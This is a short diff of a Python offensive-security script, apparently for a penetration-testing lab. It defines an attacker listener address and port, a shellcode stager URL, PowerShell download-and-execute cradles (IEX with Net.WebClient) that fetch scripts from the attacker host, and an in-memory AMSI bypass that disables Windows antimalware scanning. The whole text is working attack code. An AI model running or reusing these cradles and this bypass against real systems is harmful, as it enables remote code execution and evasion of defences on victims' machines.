@@ -13,7 +13,9 @@ from libpinvoke import PINVOKE
 # LHOST="10.10.14.110"
 LHOST = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
 LPORT = "443"
+WEBROOT = "/var/www/html"
 STAGER_URL = f"http://{LHOST}/sc"
+PS_IEX_WEBCLIENT = "IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/{tool}')"
 PS_RUNTXT_CMD = f"IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/run.txt')"
 PS_AMSI = r'''$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)'''
 
